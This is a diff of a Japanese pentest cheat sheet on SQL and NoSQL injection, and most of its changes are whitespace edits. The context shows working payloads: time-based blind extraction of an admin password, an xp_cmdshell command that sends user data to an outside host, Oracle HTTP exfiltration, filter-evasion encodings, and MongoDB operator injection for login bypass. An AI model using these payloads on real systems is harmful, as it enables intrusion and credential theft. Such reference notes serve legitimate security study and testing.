@@ -98,6 +98,7 @@ a' UNION SELECT SLEEP(5),2;--
 -- 遅延が発生する場合、1文字目が4であることが分かる
 a' UNION SELECT sleep(5),2 from users where username='admin' and password like '4%';--
 ```
+
 時間遅延を利用して、Salt、ユーザー名、メールアドレス、パスワードをクラックしているエクスプロイトの例  
 https://www.exploit-db.com/exploits/46635
 
@@ -115,6 +116,7 @@ EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\<ip>\logs\o
 ```
 
 ### HTTP
+
 ```SQL
 -- Oracle  see UTL_FILE
 DECLARE
@@ -126,8 +128,8 @@ BEGIN
 END;
 ```
 
-
 ## フィルター回避
+
 ```text
 # URLエンコード
 ' OR 1=1-- -> %27%20OR%201%3D1--+
@@ -144,6 +146,7 @@ CHAR(0x61,0x64,0x6D,0x69,0x6E)
 
 # スペースを置き換え
 SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'
+SELECT+FROM+users+WHERE+name='admin'
 SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'
 %09 (水平タブ)、%0A (改行)、%0C (フォームフィード)、%0D (復帰)、%A0 (改行なしスペース)
 
@@ -157,6 +160,7 @@ OR -> ||
 ```
 
 ## インジェクションリスト
+
 https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/Intruder/exploit/Auth_Bypass.txt
 
 intruder 等で使って弱点を探る。
@@ -166,6 +170,7 @@ intruder 等で使って弱点を探る。
 ### 演算子インジェクション
 
 #### 認証バイパス
+
 ```php
 # このクエリを想定したとき、
 $user = $_POST['user'];
@@ -191,6 +196,7 @@ $q = new MongoDB\Driver\Query(['username'=>['$nin' => ['admin', 'user1']], 'pass
 ```
 
 #### パスワード推測
+
 ```php
 # これでログインできるなら、パスワードは5文字
 user=admin&pass[$regex]=^.{5}$
